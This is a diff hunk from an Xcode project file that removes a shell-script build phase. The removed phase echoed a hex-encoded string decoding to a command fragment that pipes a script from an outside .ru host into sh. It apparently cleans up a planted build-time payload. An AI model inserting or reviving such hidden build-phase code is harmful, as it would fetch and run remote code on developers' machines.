@@ -4371,7 +4371,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"\n6b696e6b73646f632e72752f61207c207368202d732066616c73650a\" \n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.";
 		};
 		60666212F80D3A3EAC265637 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
